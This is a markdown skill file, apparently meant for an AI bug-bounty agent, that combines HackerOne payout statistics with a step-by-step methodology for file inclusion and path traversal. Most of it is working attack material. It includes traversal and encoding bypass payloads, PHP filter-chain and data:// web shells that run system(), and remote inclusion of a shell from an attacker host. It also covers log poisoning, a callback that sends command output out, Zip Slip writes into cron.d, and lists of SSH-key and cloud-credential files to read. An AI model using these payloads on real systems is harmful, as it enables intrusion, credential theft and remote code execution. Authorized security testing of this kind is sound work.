---
name: path-traversal
description: >-
  Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log
  poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers,
  RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and
  false-positive discipline. Use when hunting file-include or path-traversal bugs on any target. Combined
  with the HackerOne field guide (real disclosed-report data: where it pays, quick wins, payload banks).
  Hunt path traversal, local file inclusion, and arbitrary file read. Use when testing downloads, imports,
  logs, templates, and static file servers. Backed by 300 disclosed HackerOne reports.
---

# Path Traversal — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Path Traversal / LFI / File Read — HackerOne field guide

Built from **300** publicly disclosed HackerOne reports (2016–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **300** · paid: **52**
- Median bounty **$1,000** · p90 **$6,000** · max **$29,000** · total **$151,224**
- Median upvotes **12**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 5 | $79,000 | 2157 |
| Internet Bug Bounty | 11 | $18,355 | 368 |
| Basecamp | 3 | $9,337 | 158 |
| Mail.ru | 15 | $8,300 | 729 |
| PortSwigger Web Security | 3 | $6,000 | 322 |
| Mozilla | 2 | $6,000 | 233 |
| Keybase | 1 | $5,000 | 196 |
| Slack | 1 | $3,500 | 50 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`file` `path` `filename` `template` `lang` `download` `export` `log` `image` `folder` `dir`

## Tools

`ffuf` · `Burp` · `dotdotpwn` · `nuclei`

## Escalation chains

- LFI -> log poisoning -> RCE.
- Arbitrary file read -> secrets -> ATO.
- Zip slip -> webshell.

## Related

- `rce` (1,399 reports)
- `file-upload` (100 reports)
- `info-disclosure` (1,827 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

# HUNT-LFI — Local / Remote File Inclusion & Path Traversal

## Crown Jewel Targets

LFI that reaches code execution is Critical. Pure file-read is High when it exposes secrets (`.env`, `wp-config.php`, private keys, cloud creds), Medium when it only reads non-sensitive files.

**Highest-value chains (in rough order of reliability in 2026):**
- **PHP filter-chain → RCE** — the modern default. A bare `php://filter` *file-read* primitive is upgraded to RCE with **no upload endpoint and no writable file** by chaining `iconv` conversions to forge an arbitrary PHP payload in-memory (Synacktiv, 2022). See the dedicated section below. This is the single most impactful thing to try and the most-missed.
- **Log poisoning → RCE** — inject PHP into an Apache/Nginx log (User-Agent / URL path), then include the log. Increasingly blocked by `open_basedir` and unreadable log perms, so verify the log is *readable* first.
- **PHP wrappers → source disclosure** — `php://filter/convert.base64-encode/resource=index.php` leaks source; read source to find more LFI sinks, secrets, and the include base path.
- **RFI → RCE** — when `allow_url_include=On`, `?file=http://OOB/shell.txt` pulls and executes remote code. Rare on modern configs but trivially Critical when present.
- **phar:// deserialization** — a crafted PHAR + any unserialize-on-metadata sink → object-injection RCE.
- **zip:// / data:// chains** and **session/upload poisoning** when filters block wrappers.

---

## OOB / Blind-LFI Confirmation Gate (Read First)

LFI is frequently **blind**: the included content is parsed/executed but never reflected, or the page swallows the file into a template you can't see. Do **not** claim LFI from indirect signals alone.

### What is NOT confirmation
- A different status code or error string for `../../etc/passwd` vs a normal value. The app may be string-matching `../` and returning a canned 403/500 without ever touching the filesystem.
- Your input **echoed back** inside an error message (e.g. `failed to open '/var/www/../../etc/passwd'`). That is the path *formatter*, not proof the file was read. A genuine read shows file **contents**, not your path.
- A page that "looks different." Reflected-input or WAF block pages produce diffs unrelated to a real read.

### What IS confirmation
- **Direct read:** actual file *contents* appear (real `root:x:0:0:` line, real PHP source after base64-decoding the filter output).
- **Blind read via OOB exfil:** use a php://filter or XXE-style chain whose payload performs a DNS/HTTP callback to your **Burp Collaborator** subdomain, or use an `expect://` / wrapper that triggers an outbound request. A unique-per-sink Collaborator hit (DNS + HTTP, with the server's source IP) proves the include ran.
- **Blind read via differential/timing:** include a file you *know* exists and is large (`/etc/passwd`) vs one that does not (`/etc/passwd_nope_<rand>`). Stable, repeatable response-length or latency delta = real filesystem access. Confirm with a third known-good path to rule out coincidence.

### Default workflow
1. Pick a **unique marker** target: prefer a file whose content you can fingerprint exactly (`/etc/passwd` → grep `^root:`). For blind, use a php://filter base64 read and decode — partial/truncated base64 still decodes to recognizable source.
2. Generate a sub-tagged Collaborator payload per sink (`lfi-page.<collab>`, `lfi-tpl.<collab>`) so callbacks identify which parameter fired.
3. Send, wait 30–120s, poll OOB.
4. Claim LFI **only** after a content match, a Collaborator callback, or a stable triple-confirmed timing/length delta. Echoed paths and lone status-code changes are retracted.

---

## Attack Surface Signals

### URL / Body Parameters
```
?page=  ?file=  ?path=  ?template=  ?view=  ?lang=  ?module=
?include=  ?doc=  ?load=  ?read=  ?content=  ?theme=  ?layout=
?component=  ?download=  ?img=  ?pdf=  ?report=  ?style=  ?dir=
JSON bodies: {"filename":...} {"template":...} {"path":...}
```

### Technology Stack Signals
| Signal | Vector |
|--------|--------|
| PHP (`X-Powered-By`, `.php`, PHPSESSID) | php:// filter-chain RCE, phar://, zip://, data:// |
| Apache/Nginx logs readable | Log poisoning → RCE (verify readability first) |
| Apache 2.4.49 / 2.4.50 (`Server:` banner) | CVE-2021-41773 / CVE-2021-42013 traversal → RCE |
| PHP-CGI on Windows (XAMPP, `php-cgi.exe`) | CVE-2024-4577 arg-injection → RCE |
| Java servlet (`/WEB-INF/`) | `WEB-INF/web.xml`, `classes/`, `application.properties` |
| Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
| Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
| Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |

---

## Step-by-Step Methodology

### Phase 1 — Identify Candidates
```bash
cat recon/$TARGET/urls.txt | gf lfi > recon/$TARGET/lfi-candidates.txt
grep -E "(\?|&)(page|file|path|template|view|lang|module|include|doc|load|read|content|download|img|pdf|report|dir)=" \
  recon/$TARGET/urls.txt
ffuf -u "https://$TARGET/FUZZ" -w ~/wordlists/lfi-paths.txt -mc 200,301,302
```

### Phase 2 — Path Traversal (read)
```bash
?file=../../../etc/passwd
?file=....//....//....//etc/passwd            # ../ stripping once → ....// survives
?file=..%2f..%2f..%2fetc%2fpasswd             # single URL-encode
?file=..%252f..%252f..%252fetc%252fpasswd     # double encode (decoded twice server-side)
?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd          # encode dots too
?file=/etc/passwd%00.png                      # null byte — PHP < 5.3.4 only
?file=....\/....\/etc\/passwd                  # mixed slash
# Prefix-forced base (app prepends /var/www/): pad with extra ../, or absolute path if no prefix
# UTF-8 overlong: %c0%ae%c0%ae%2f  (legacy servers)
```
```bash
# Windows
?file=..\..\..\windows\win.ini
?file=..%5c..%5c..%5cwindows%5cwin.ini
?file=C:\inetpub\wwwroot\web.config
```

### Phase 3 — PHP Wrappers (source disclosure)
```bash
?file=php://filter/convert.base64-encode/resource=index.php   # decode base64 → source
?file=php://filter/read=string.rot13/resource=config.php
?file=php://filter/convert.base64-encode/resource=../app/Config.php
# Always base64-encode source reads: raw <?php ... ?> is parsed/swallowed and you see nothing.
```

### Phase 4 — PHP Filter-Chain → RCE (no upload, no writable file)
The modern flagship technique (Synacktiv, 2022). If you have a `php://`-capable LFI that *reads* a file, you can also *execute* attacker-chosen PHP. `iconv` charset conversions, chained inside `php://filter`, emit controlled bytes that prepend to the resource until a full `<?php ... ?>` payload is forged — then `include()` runs it. **No upload endpoint, no log access, no writable path required.**

```bash
# Generate the chain (public tool, no CVE — it abuses documented iconv behaviour):
#   git clone https://github.com/synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Tool prints a long php://filter|convert.iconv.*|...|resource=php://temp string.
# Drop it into the sink:
?file=php://filter/convert.iconv.UTF8.CSISO2022KR|...<long-chain>...|convert.base64-decode/resource=php://temp&c=id
```
Notes / gotchas:
- Requires the include sink to accept the `php://filter` scheme (most LFI sinks calling `include`/`require`/`file_get_contents` on the param do).
- Payloads get **long** (10–50KB). If the param is length-capped or WAF-blocked on size, move it to a POST body, or use a minimal payload (`<?=`shorthand`?>`).
- For blind targets, set the chain payload to a Collaborator callback (`<?php file_get_contents("http://x.<collab>/".`id`);?>`) to confirm execution OOB.
- This works even when log poisoning fails (unreadable logs, `open_basedir`). Try it whenever you have a php:// filter read.

### Phase 5 — Code-Execution Wrappers (config prerequisites)
```bash
# data:// — executes inline; REQUIRES allow_url_include=On
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+&c=id   # <?php system($_GET['c']);?>

# php://input — body is treated as the included resource; ALSO REQUIRES allow_url_include=On
#   POST ?file=php://input    body: <?php system($_GET['c']); ?>
#   (Same prerequisite as data://. Do NOT assume this works on default PHP config.)

# expect:// — direct command exec; requires the (rare) expect extension loaded
?file=expect://id
```

### Phase 6 — Remote File Inclusion (RFI)
RFI = the include target is a **remote URL**. Prerequisite: `allow_url_include=On` (and `allow_url_fopen=On`). Off by default on modern PHP, but still seen on legacy/misconfigured hosts.
```bash
# Host a payload you control, then:
?file=http://OOB-HOST/shell.txt          # shell.txt contains <?php system($_GET['c']); ?>
?file=https://OOB-HOST/shell.txt?
?file=ftp://OOB-HOST/shell.txt
# Detection without RCE: point at a Burp Collaborator HTTP URL. A callback (server IP) = the
# include fetched remotely → RFI confirmed even if execution is blocked. No callback = not RFI.
# Bypass appended extension (?file=$x.".php"): trailing ? or # to truncate, or ?file=http://OOB/shell
```

### Phase 7 — Log Poisoning → RCE
```bash
# Step 1: inject PHP into a log the include can read
curl -s "https://$TARGET/" -H "User-Agent: <?php system(\$_GET['c']); ?>"
# Step 2: include it (verify the log is readable first — read it plain before poisoning)
?file=../../../var/log/apache2/access.log&c=id
?file=../../../var/log/nginx/access.log&c=id
?file=/proc/self/fd/0&c=id                  # stdin fd (varies)
# Candidate logs: /var/log/apache2/access.log /var/log/httpd/access_log
#   /var/log/nginx/access.log /var/log/auth.log (SSH user poisoning) /proc/self/environ
```

### Phase 8 — Session / Upload Poisoning
```bash
# PHP session: set payload in a stored field (username/profile), then include the session file
?file=/var/lib/php/sessions/sess_<PHPSESSID>&c=id
?file=/tmp/sess_<PHPSESSID>&c=id
# phar:// object injection (needs an unserialize-on-metadata sink + any file upload):
?file=phar:///var/www/uploads/evil.jpg     # JPEG magic bytes prepended to a PHAR
# zip:// — archive containing the target, or a symlink to /etc/passwd
?file=zip:///var/www/uploads/a.zip%23path/inside.txt
```

### Phase 8b — Archive-extraction & image-processing sinks (no `?file=` needed)
Two LFI/traversal surfaces that are not query-parameter file reads:
- **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
- **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `file-upload`.

### Phase 9 — Automation (then manual-confirm everything)
```bash
ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt --hh <baseline-len> \
  "https://$TARGET/page.php?file=FUZZ"
dotdotpwn -m http -h $TARGET -o unix
# Burp: Intruder over the bypass table; Collaborator for blind/RFI confirmation.
```

---

## Sensitive Files to Read
```
# Linux
/etc/passwd  /etc/hosts  /etc/shadow (rarely readable)
/proc/self/environ  /proc/self/cmdline  /proc/self/status
/var/www/html/.env  /var/www/html/config.php  /var/www/html/wp-config.php
/home/*/.ssh/id_rsa  /root/.ssh/id_rsa  /root/.bash_history
/var/www/html/app/config/parameters.yml   # Symfony
.git/config  .git/HEAD  composer.json  package.json
# App / cloud secrets
/proc/self/environ  ~/.aws/credentials  ~/.docker/config.json  /run/secrets/*
# Windows / .NET
C:\Windows\win.ini  C:\inetpub\wwwroot\web.config  ..\..\web.config
C:\Windows\System32\inetsrv\config\applicationHost.config
```

---

## Chain Table

| LFI primitive | Chain to | Impact |
|---------------|----------|--------|
| `php://filter` read | **filter-chain RCE (Phase 4)** | RCE with no upload — **Critical** |
| File read | `.env` / `config.php` / `wp-config.php` | DB creds, API keys → backend takeover |
| File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
| Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
| File read + upload | phar:// / log / session poison | RCE — **Critical** |
| Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |

---

## Validation Discipline

**Direct-read proof (not a false positive):**
- Show real *contents*, not your echoed path. `/etc/passwd` must contain a literal `root:x:0:0:root:/root:` line. Diff the response against a known-good param value — the delta must be the file body, not a WAF/error page.
- For source reads, the **base64 must decode to valid PHP**. A garbage/empty decode = no real read.
- Rule out reflection: confirm the marker text is not simply your input bounced back. Request `/etc/passwd` and `/etc/passwd_<rand>` (non-existent) — only the real file returns content.

**Blind / OOB proof:**
- No reflection? Use a php://filter-chain or RFI payload that calls back to a **unique Burp Collaborator subdomain**. Require a DNS + HTTP hit with the server's source IP before claiming the include executed. Sub-tag per sink.
- Timing/length blind: triple-confirm a stable delta (known-large file vs missing file vs second known file). One-off deltas are noise — retract.

**Partial / truncated reads:**
- Templating may HTML-escape or cut the file. Use `php://filter/convert.base64-encode` so even a truncated read decodes to recognizable bytes; report exactly what you recovered, not what you assume is there.

**RCE proof:** show command output you control — `id` / `whoami` / `hostname` reflected, or an OOB callback from inside the executed payload (`curl http://<collab>/`). "The payload was accepted" is not RCE.

**Severity:**
- Non-sensitive file read: **Medium**
- File read exposing DB creds / API keys / private keys / cloud creds: **High**
- RCE via filter-chain / RFI / log / session / phar / CVE: **Critical**

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, file types to look
- Parameter inventory beyond the classics: `?file= ?path= ?filename= ?template= ?view= ?lang= ?module= ?include= ?doc= ?load= ?read= ?content= ?download= ?img= ?pdf= ?report= ?style= ?dir=`, plus JSON bodies `{"filename":...}`, `{"path":...}`, `{"template":...}`.
- Non-query sinks that are easy to miss: multipart `filename` fields (PortSwigger labs for superfluous decode and null-byte bypass both use this), `Content-Disposition` filenames (curl CVE family), archive extraction entry names (Zip Slip), tar symlinks, and image-processing coder paths.
- Framework-specific 2025-2026 advisories to pattern-match: h3 `serveStatic()` GHSA-wr4h-v87w-p3r7 (percent-encoded `%2e%2e` dot segments), curl `file://` protocol handler traversals and FTP wildcard-download escapes, Weblate `.svn/.bzr` VCS metadata exclusion bypass CVE-2026-61792, WordPress `_wp_attachment_metadata` poisoning → arbitrary file deletion.
- Client-side path traversal (CSPT): encoded `../` in SPA router paths (React Router, Next.js, Vue Router, Angular, SvelteKit, Nuxt, Ember, SolidStart) bypasses route guards and controls the API URL — a CSRF/XSS primitive. Browser normalises literal `../` but not `%2E%2E`; backslashes normalise to slashes.
- Nginx alias misconfiguration: `location /images/ { alias /var/www/app/img/; }` without the trailing slash permits `/images../config.php`. Also check `location = /admin { deny all; }` bypass via trailing slash.
- Static-file/download endpoints, template/include params, export/report generators, and CDN origin paths are the recurring high-value locations.
- Fingerprint the stack to pick a payload: PHP → filters/phar/zip; Java servlet → `WEB-INF/web.xml`; Python → `/proc/self/environ`, `settings.py`; Node → h3/express static serving; Windows IIS → `..\..\web.config`.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Baseline payloads: `../../../etc/passwd`, `....//....//....//etc/passwd` (single-pass `../` strip), `..%2f..%2f..%2fetc%2fpasswd`, `..%252f..%252f..%252fetc%252fpasswd` (double decode), `%2e%2e%2f`, `..%c0%af`, `..%ef%bc%8f`.
- Absolute-path bypass when `../` is blocked but the filename is treated as relative: `filename=/etc/passwd`.
- Prefix-forced base: supply the expected base then traverse — `/var/www/images/../../../etc/passwd`.
- Extension check bypass with null byte: `../../../etc/passwd%00.png` (PHP < 5.3.4 / legacy stacks only).
- Percent-encoded dot segments with no normalisation (h3 advisory): `curl --path-as-is 'http://host/%2e%2e/%2e%2e/%2e%2e/etc/passwd'` — FastURL returns the raw path, `decodeURI()` turns `%2e` into `.`, then `path.join` resolves it at the OS. Use `--path-as-is` or Burp so the client does not normalise it.
- Windows variants: `..\..\..\windows\win.ini`, `..%5c`, `C:\inetpub\wwwroot\web.config`, and extra trailing dots/slashes (Windows ignores them).
- PHP source disclosure via wrapper: `php://filter/convert.base64-encode/resource=index.php` — always base64-encode, otherwise `<?php ... ?>` is parsed and swallowed.
- Zip Slip / tar symlink: craft archive entry names `../../../etc/cron.d/x` or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the extraction dir.
- ImageMagick coder read sinks without any file param: `label:@/etc/passwd`, `<image xlink:href="msl:/etc/passwd">`, `ephemeral:`/`msl:` pseudo-protocols (ImageTragick family).
- Detection workflow: use a unique, fingerprintable target (`^root:x:0:0:` in `/etc/passwd`) and request a known-missing sibling (`/etc/passwd_<rand>`) as the control. For blind cases, sub-tag Collaborator payloads per sink.

### C. Validation / proof bar — how to confirm and avoid false positives
- Real confirmation is file **contents**, not your echoed path. `failed to open '/var/www/../../etc/passwd'` is the path formatter, not a read.
- A lone status-code or error-string difference is not proof — the app may be string-matching `../` and returning a canned 403/500 without touching the filesystem.
- Diff the response against a known-good parameter value; the delta must be the file body, not a WAF/error page.
- For source reads, the base64 must decode to valid PHP/source — a garbage or empty decode means no read occurred.
- Blind reads require a unique Collaborator DNS+HTTP hit with the server's source IP, or a triple-confirmed stable length/latency delta (large existing file vs missing file vs second known file). One-off deltas are noise.
- Rule out reflection: request `/etc/passwd` and `/etc/passwd_<rand>`; only the real file returns content.
- A blank response from `file://` often means the file contained `<`, `>`, or `&` and broke the parse — use a base64 filter or a different file before concluding the file is unreadable.
- Partial/truncated reads are still valid — report exactly what was recovered, using base64 so truncated output still decodes to recognisable bytes.
- RCE proof (filter-chain/RFI/log/session/phar/CVE) requires command output you control (`id`/`whoami`) or an OOB callback from inside the executed payload. "Payload accepted" is not RCE.
- Severity: non-sensitive file read → Medium; secrets/keys/cloud creds → High; RCE via filter-chain/RFI/poisoning/CVE → Critical.

**Encoding bypass matrix (PortSwigger / OWASP canonical list):**
- `../` → `..%2f`, `%2e%2e/`, `%2e%2e%2f`, `..%5c` (Windows), `%2e%2e%5c`.
- Double-encoded: `%252e%252e%252f`, `..%255c`.
- Overlong UTF-8: `..%c0%af`, `..%c1%9c`.
- Backslash as separator: `..\`, `..%5c`, `..\\`, and mixed `....\/`.
- Nested single-pass strip: `....//` reverts to `../` when the inner `../` is removed once.
- Null byte for extension checks: `%00.png` appended after the target path.

**Sensitive-file hit list by platform:**
- Linux: `/etc/passwd`, `/etc/hosts`, `/etc/shadow` (rarely readable), `/proc/self/environ`, `/proc/self/cmdline`, `/var/www/html/.env`, `wp-config.php`, `~/.aws/credentials`, `/run/secrets/*`, `.git/config`.
- Windows: `C:\Windows\win.ini`, `C:\inetpub\wwwroot\web.config`, `..\..\web.config`, `C:\Windows\System32\inetsrv\config\applicationHost.config`.
- Java: `WEB-INF/web.xml`, `WEB-INF/classes/application.properties`, `.war`/`.jar` contents.
- Python: `settings.py`, `SECRET_KEY`, `/proc/self/environ`.
- Node: `.env`, `package.json`, `dist/` source maps.

**Common reasons a traversal payload fails:**
- The app prepends a base directory and canonicalises — try an absolute path or include the base prefix followed by `../`.
- The parameter is length-capped or the sink rejects long payloads — use a short absolute path.
- The extension check requires `.png`/`.jpg` — append `%00.png` or a `?`/`#` truncation.
- The front-end normalises the path before sending — use `--path-as-is` in curl or edit the raw request in Burp; encode the dots as `%2e`.
- The framework decodes differently from the WAF — double-encode or use non-standard Unicode separators.
- The file exists but is unreadable by the service account — switch to a world-readable target such as `/etc/hostname`.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/web-security/file-path-traversal
2. https://github.com/h3js/h3/security/advisories/GHSA-wr4h-v87w-p3r7
